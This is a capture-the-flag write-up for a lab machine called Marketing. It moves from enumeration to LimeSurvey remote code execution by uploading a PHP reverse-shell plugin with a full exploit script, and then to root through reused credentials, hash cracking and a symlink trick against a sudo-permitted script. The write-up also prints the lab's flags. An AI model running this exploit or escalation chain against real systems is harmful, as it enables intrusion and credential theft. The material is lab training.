# CTF Writeup: Marketing

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.196.225
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-27 07:05 EST
Nmap scan report for 192.168.196.225
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: marketing.pg - Digital Marketing for you!
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   26.81 ms 192.168.45.1
2   26.70 ms 192.168.45.254
3   27.16 ms 192.168.251.1
4   27.19 ms 192.168.196.225

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.46 seconds
```

Enumerated endpoints and found an /old directory.

```
gobuster dir -u http://marketing.pg -w /usr/share/wordlists/dirb/big.txt     
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://marketing.pg
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,jpg,zip,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.jpg        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htaccess.zip        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd.zip        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.jpg        (Status: 403) [Size: 277]
/about-us.html        (Status: 200) [Size: 20099]
/assets               (Status: 301) [Size: 313] [--> http://marketing.pg/assets/]
/contact-us.html      (Status: 200) [Size: 10783]
/index.html           (Status: 200) [Size: 18286]
/old                  (Status: 301) [Size: 310] [--> http://marketing.pg/old/]
/server-status        (Status: 403) [Size: 277]
/vendor               (Status: 301) [Size: 313] [--> http://marketing.pg/vendor/]
Progress: 122814 / 122814 (100.00%)
===============================================================
Finished
===============================================================
```

Found an interesting subdomain within the source code, let's map it to our target ip in our local dns file.

```
sudo echo "192.168.196.225 customers-survey.marketing.pg" | sudo tee -a /etc/hosts
```

It seems to be running "LimeSurvey" Application.

## Vulnerability Assessment

Let's search CVE's for LimeSurvey.

```
searchsploit LimeSurvey                                          
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
LimeSurvey (PHPSurveyor 1.91+ stable) - Blind SQL Injection                                                 | php/webapps/18508.txt
LimeSurvey (phpsurveyor) 1.49rc2 - Remote File Inclusion                                                    | php/webapps/4156.txt
LimeSurvey 1.52 - 'language.php' Remote File Inclusion                                                      | php/webapps/4544.txt
LimeSurvey 1.85+ - 'admin.php' Cross-Site Scripting                                                         | php/webapps/35787.txt
LimeSurvey 1.92+ build120620 - Multiple Vulnerabilities                                                     | php/webapps/19330.txt
LimeSurvey 2.00+ (build 131107) - Multiple Vulnerabilities                                                  | php/webapps/29789.txt
LimeSurvey 3.17.13 - Cross-Site Scripting                                                                   | php/webapps/47386.txt
LimeSurvey 4.1.11 - 'File Manager' Path Traversal                                                           | php/webapps/48297.txt
LimeSurvey 4.1.11 - 'Permission Roles' Persistent Cross-Site Scripting                                      | php/webapps/48523.txt
LimeSurvey 4.1.11 - 'Survey Groups' Persistent Cross-Site Scripting                                         | php/webapps/48289.txt
LimeSurvey 4.3.10 - 'Survey Menu' Persistent Cross-Site Scripting                                           | php/webapps/48762.txt
LimeSurvey 5.2.4 - Remote Code Execution (RCE) (Authenticated)                                              | php/webapps/50573.py
LimeSurvey < 3.16 - Remote Code Execution                                                                   | php/webapps/46634.py
LimeSurvey Community 5.3.32 - Stored XSS                                                                    | php/webapps/51926.txt
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Utilized the following exploit for this:

```
git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git
```

Setup the php shell with my target ip and port.

Created an .zip file from the php shell and the config.xml.

```
zip Y1LD1R1M.zip php-rev.php config.xml 
  adding: php-rev.php (deflated 61%)
  adding: config.xml (deflated 56%)
```

Default Credentials for LimeSurvey are admin:password

## Initial Access

Modified the exploit to following:

```
# Exploit Title: LimeSurvey RCE
# Google Dork: inurl:limesurvey/index.php/admin/authentication/sa/login
# Date: 05.12.2021
# Exploit Author: Y1LD1R1M
# Vendor Homepage: https://www.limesurvey.org/
# Software Link: https://download.limesurvey.org/latest-stable-release/limesurvey5.2.4+211129.zip
# Version: 5.2.x
# Tested on: Kali Linux 2021.3
# Reference: https://github.com/Y1LD1R1M-1337/Limesurvey-RCE

#!/usr/bin/python
# -*- coding: utf-8 -*-


import requests
import sys
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
print("_______________LimeSurvey RCE_______________")
print("")
print("")
print("Usage: python exploit.py URL username password port")
print("Example: python exploit.py http://192.26.26.128 admin password 80")
print("")
print("")
print("== ██╗   ██╗ ██╗██╗     ██████╗  ██╗██████╗  ██╗███╗   ███╗ ==")
print("== ╚██╗ ██╔╝███║██║     ██╔══██╗███║██╔══██╗███║████╗ ████║ ==")
print("==  ╚████╔╝ ╚██║██║     ██║  ██║╚██║██████╔╝╚██║██╔████╔██║ ==")
print("==   ╚██╔╝   ██║██║     ██║  ██║ ██║██╔══██╗ ██║██║╚██╔╝██║ ==")
print("==    ██║    ██║███████╗██████╔╝ ██║██║  ██║ ██║██║ ╚═╝ ██║ ==")
print("==    ╚═╝    ╚═╝╚══════╝╚═════╝  ╚═╝╚═╝  ╚═╝ ╚═╝╚═╝     ╚═╝ ==")
print("")
print("")
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
port = sys.argv[4]

req = requests.session()
print("[+] Retrieving CSRF token...")
loginPage = req.get(url+"/index.php/admin/authentication/sa/login")
response = loginPage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token = s.findAll('input')[0].get("value")
print(CSRF_token)
print("[+] Sending Login Request...")

login_creds = {
          "user": username,
          "password": password,
          "authMethod": "Authdb",
          "loginlang":"default",
          "action":"login",
          "width":"1581",
          "login_submit": "login",
          "YII_CSRF_TOKEN": CSRF_token
}
print("[+]Login Successful")
print("")
print("[+] Upload Plugin Request...")
print("[+] Retrieving CSRF token...")
filehandle = open("/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Marketing/Limesurvey-RCE/Y1LD1R1M.zip",mode = "rb") # CHANGE THIS
login = req.post(url+"/index.php/admin/authentication/sa/login" ,data=login_creds)
UploadPage = req.get(url+"/index.php/admin/pluginmanager/sa/index")
response = UploadPage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token2 = s.findAll('input')[0].get("value")
print(CSRF_token2)
Upload_creds = {
          "YII_CSRF_TOKEN":CSRF_token2,
          "lid":"$lid",
          "action": "templateupload"
}
file_upload= req.post(url+"/index.php/admin/pluginmanager?sa=upload",files = {'the_file':filehandle},data=Upload_creds)
UploadPage = req.get(url+"/index.php/admin/pluginmanager?sa=uploadConfirm")
response = UploadPage.text
print("[+] Plugin Uploaded Successfully")
print("")
print("[+] Install Plugin Request...")
print("[+] Retrieving CSRF token...")

InstallPage = req.get(url+"/index.php/admin/pluginmanager?sa=installUploadedPlugin")
response = InstallPage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token3 = s.findAll('input')[0].get("value")
print(CSRF_token3)
Install_creds = {
          "YII_CSRF_TOKEN":CSRF_token3,
          "isUpdate": "false"
}
file_install= req.post(url+"/index.php/admin/pluginmanager?sa=installUploadedPlugin",data=Install_creds)
print("[+] Plugin Installed Successfully")
print("")
print("[+] Activate Plugin Request...")
print("[+] Retrieving CSRF token...")
ActivatePage = req.get(url+"/index.php/admin/pluginmanager?sa=activate")
response = ActivatePage.text
s = BeautifulSoup(response, 'html.parser')
CSRF_token4 = s.findAll('input')[0].get("value")
print(CSRF_token4)
Activate_creds = {
          "YII_CSRF_TOKEN":CSRF_token4,
          "pluginId": "1" # CHANGE THIS
}
file_activate= req.post(url+"/index.php/admin/pluginmanager?sa=activate",data=Activate_creds) 
print("[+] Plugin Activated Successfully")
print("")
print("[+] Reverse Shell Starting, Check Your Connection :)")
shell= req.get(url+"/upload/plugins/Y1LD1R1M/php-rev.php") # CHANGE THIS
```

Started up my listener on port 80.

```
nc -lvnp 80
```

Ran the exploit.

```
python exploit.py http://customers-survey.marketing.pg admin password 80
_______________LimeSurvey RCE_______________


Usage: python exploit.py URL username password port
Example: python exploit.py http://192.26.26.128 admin password 80


== ██╗   ██╗ ██╗██╗     ██████╗  ██╗██████╗  ██╗███╗   ███╗ ==
== ╚██╗ ██╔╝███║██║     ██╔══██╗███║██╔══██╗███║████╗ ████║ ==
==  ╚████╔╝ ╚██║██║     ██║  ██║╚██║██████╔╝╚██║██╔████╔██║ ==
==   ╚██╔╝   ██║██║     ██║  ██║ ██║██╔══██╗ ██║██║╚██╔╝██║ ==
==    ██║    ██║███████╗██████╔╝ ██║██║  ██║ ██║██║ ╚═╝ ██║ ==
==    ╚═╝    ╚═╝╚══════╝╚═════╝  ╚═╝╚═╝  ╚═╝ ╚═╝╚═╝     ╚═╝ ==


[+] Retrieving CSRF token...
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Marketing/Limesurvey-RCE/exploit.py:46: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.
  CSRF_token = s.findAll('input')[0].get("value")
SklzNlZPX1FJZ0dEelVWQWZTTjZSQm8xWDNRN1dlQjRPCvg0SQCTsSUaru7ppfdoVcSsLtqD0BGflWr1gCec8g==
[+] Sending Login Request...
[+]Login Successful

[+] Upload Plugin Request...
[+] Retrieving CSRF token...
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Marketing/Limesurvey-RCE/exploit.py:69: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.
  CSRF_token2 = s.findAll('input')[0].get("value")
Z3NHME5RUTRBajZ2QUVpeEZYR1hVSk11bzZvNXJwS2gFIXKoK_G_3J8R0jpvo43Hzn_2FC_CYLS0n21-bqqs6A==
[+] Plugin Uploaded Successfully

[+] Install Plugin Request...
[+] Retrieving CSRF token...
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Marketing/Limesurvey-RCE/exploit.py:87: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.
  CSRF_token3 = s.findAll('input')[0].get("value")
Z3NHME5RUTRBajZ2QUVpeEZYR1hVSk11bzZvNXJwS2gFIXKoK_G_3J8R0jpvo43Hzn_2FC_CYLS0n21-bqqs6A==
[+] Plugin Installed Successfully

[+] Activate Plugin Request...
[+] Retrieving CSRF token...
/home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Marketing/Limesurvey-RCE/exploit.py:101: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.
  CSRF_token4 = s.findAll('input')[0].get("value")
Z3NHME5RUTRBajZ2QUVpeEZYR1hVSk11bzZvNXJwS2gFIXKoK_G_3J8R0jpvo43Hzn_2FC_CYLS0n21-bqqs6A==
[+] Plugin Activated Successfully

[+] Reverse Shell Starting, Check Your Connection :)
```

Gained RCE as user "www-data".

```
nc -lvnp 80                                
listening on [any] 80 ...
connect to [192.168.45.164] from (UNKNOWN) [192.168.196.225] 58134
Linux marketing 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 12:57:40 up 54 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

## Privilege Escalation

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL +Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Enumerated users on the target system.

```
www-data@marketing:/$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
t.miller:x:1000:1000::/home/t.miller:/bin/bash
m.sander:x:1001:1001::/home/m.sander:/bin/bash
```

Enumerated SUID Binaries.

```
www-data@marketing:/$ find / -perm /4000 2>/dev/null
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/at
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/snap/core20/1328/usr/bin/chfn
/snap/core20/1328/usr/bin/chsh
/snap/core20/1328/usr/bin/gpasswd
/snap/core20/1328/usr/bin/mount
/snap/core20/1328/usr/bin/newgrp
/snap/core20/1328/usr/bin/passwd
/snap/core20/1328/usr/bin/su
/snap/core20/1328/usr/bin/sudo
/snap/core20/1328/usr/bin/umount
/snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1328/usr/lib/openssh/ssh-keysign
/snap/core20/1518/usr/bin/chfn
/snap/core20/1518/usr/bin/chsh
/snap/core20/1518/usr/bin/gpasswd
/snap/core20/1518/usr/bin/mount
/snap/core20/1518/usr/bin/newgrp
/snap/core20/1518/usr/bin/passwd
/snap/core20/1518/usr/bin/su
/snap/core20/1518/usr/bin/sudo
/snap/core20/1518/usr/bin/umount
/snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1518/usr/lib/openssh/ssh-keysign
/snap/snapd/16292/usr/lib/snapd/snap-confine
/snap/snapd/16010/usr/lib/snapd/snap-confine
```

Retrieved mysql database credentials in /var/www/LimeSurvey/application/config/config.php.

```
components' => array(
                'db' => array(
                        'connectionString' => 'mysql:host=localhost;port=3306;dbname=limesurvey;',
                        'emulatePrepare' => true,
                        'username' => 'limesurvey_user',
                        'password' => 'EzPwz2022_dev1$$23!!',
                        'charset' => 'utf8mb4',
                        'tablePrefix' => 'lime_',
```

Logged into mysql database internally.

```
www-data@marketing:/var/www/LimeSurvey/application/config$ mysql -u limesurvey_user -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 66
Server version: 8.0.29-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Retrieved admin hash

```
$2y$10$QxdVgZGY9odLkWsUYF7dNOkI.STdeEWnUiUse/9rkI.lg7T3QI5UG
```

Saved the hash locally and bruteforced it using john the ripper.

```
john admin.hash --wordlist=/usr/share/wordlists/rockyou.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (?)     
1g 0:00:00:00 DONE (2025-12-27 08:13) 2.941g/s 205.7p/s 211.7c/s 205.7C/s 123456..666666
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The password didn't work, let's try and use the password from the config.php file in order to elevate our privs.

Logged into user "t.miller" with t.miller:EzPwz2022_dev1$$23!!
```
www-data@marketing:/home$ su t.miller
Password: 
t.miller@marketing:/home$
```

Retrieved local.txt in /home/t.miller directory.

```
060e38f4b5e7f66bd553f34b58f40fe7
```

Checking which sudo permissions our user has, we found out that user m.sander can run an .sh script, which seems to be exploitable.

```
t.miller@marketing:/var/lib/mlocate$ sudo -l
Matching Defaults entries for t.miller on marketing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User t.miller may run the following commands on marketing:
    (m.sander) /usr/bin/sync.sh
```

Searched for writable system files.

```
t.miller@marketing:/var/lib/mlocate$ find / -type f -writable 2>/dev/null
/var/lib/mlocate/mlocate.db
```

Downloaded mlocate.db file onto local machine.

```
scp t.miller@192.168.196.225:/var/lib/mlocate/mlocate.db .
The authenticity of host '192.168.196.225 (192.168.196.225)' can't be established.
ED25519 key fingerprint is: SHA256:bdEzYRpG4k3NkIr03/E2H6ltJRUD52Zi5YA0fkNr/nY
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:84: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.196.225' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
t.miller@192.168.196.225's password: 
mlocate.db                                                                                                  100% 4865KB   2.5MB/s   00:01
```

Let's perform forensic on it, maybe we can find interesting files.


```
strings mlocate.db | grep creds
creds-for-2022.txt
```

Observing the file via strings, we can find the absolute path is /home/m.sander/personal/creds-for-2022.txt

Let's symlink the absolute path of the file to an variable called creds.

and run the sync.sh script with m.sander rights, maybe we can view the file that way.

```
ln -s /home/m.sander/personal/creds-for-2022.txt creds
```

Ran the script and retrieved credentials.

```
t.miller@marketing:~$ sudo -u m.sander /usr/bin/sync.sh creds
Difference: 1,3c1,8
< == NOTES ==
< - remove vhost from website (done)
< - update to newer version (todo)
\ No newline at end of file
---
> slack account:
> michael_sander@gmail.com - pa$$word@123$$4!!
> 
> github:
> michael_sander@gmail.com - EzPwz2022_dev1$$23!!
> 
> gmail:
> michael_sander@gmail.com - EzPwz2022_12345678#!
\ No newline at end of file
[+] Updated.
```

Logged into m.sander with m.sander:EzPwz2022_12345678#!

```
t.miller@marketing:~$ su m.sander
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

m.sander@marketing:/home/t.miller$
```

Logged into user "root" since user "m.sander" can run all commands with sudo rights.

```
m.sander@marketing:/home/t.miller$ sudo su
[sudo] password for m.sander: 
root@marketing:/home/t.miller#
```

Retrieved proof.txt in /root directory.

```
55f5c1308833216d7deff843fe8b722d
```
